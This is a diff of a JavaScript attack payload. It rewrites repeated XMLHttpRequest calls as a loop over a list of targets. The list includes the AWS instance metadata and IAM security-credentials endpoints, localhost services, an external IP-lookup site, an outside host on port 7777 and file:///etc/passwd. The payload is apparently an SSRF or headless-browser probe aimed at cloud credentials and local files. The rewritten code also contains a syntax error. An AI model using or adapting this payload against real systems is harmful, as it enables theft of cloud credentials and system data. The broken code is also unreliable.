@@ -1,10 +1,3 @@
-var url0 = "http://169.254.169.254/latest/dynamic/instance-identity/document";
-var url1 = "http://169.254.169.254/latest/meta-data/iam/security-credentials/admins";
-var url2 = "http://localhost:3000";
-var url3 = "http://localhost:3000/1/catalogs";
-var url4 = "http://ifconfig.pro";
-var url5 = "http://192.241.169.35:7777/url5";
-var url6 = "file:///etc/passwd";
 
 function handler() {
   console.log(1);
@@ -24,37 +17,16 @@ function handler() {
 
 var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = handler;
-try{
- xhr.open("GET", url0, true);
- xhr.send();
- } catch(err) {}
 
-try{
-xhr.open("GET", url1, true);
-xhr.send();
- } catch(err) {}
+var urls = ["http://169.254.169.254/latest/dynamic/instance-identity/document","http://169.254.169.254/latest/meta-data/iam/security-credentials/admins","http://localhost:3000","http://localhost:3000/1/catalogs","http://ifconfig.pro","http://192.241.169.35:7777/url5","file:///etc/passwd"];
+var arrayLength = urls.length;,
+for (var i = 0; i < arrayLength; i++) {
+   try{
+    xhr.open("GET", urls[i], true);
+    xhr.send();
+ } catch(err) { console.log(err); }
+}
 
-try{
-xhr.open("GET", url2, true);
-xhr.send();
- } catch(err) {}
 
-try{
-xhr.open("GET", url3, true);
-xhr.send();
- } catch(err) {}
+
  
-try{
-xhr.open("GET", url4, true);
-xhr.send();
- } catch(err) {}
- 
- try{
-xhr.open("GET", url5, true);
-xhr.send();
- } catch(err) {}
- 
-  try{
-xhr.open("GET", url6, true);
-xhr.send();
- } catch(err) {}
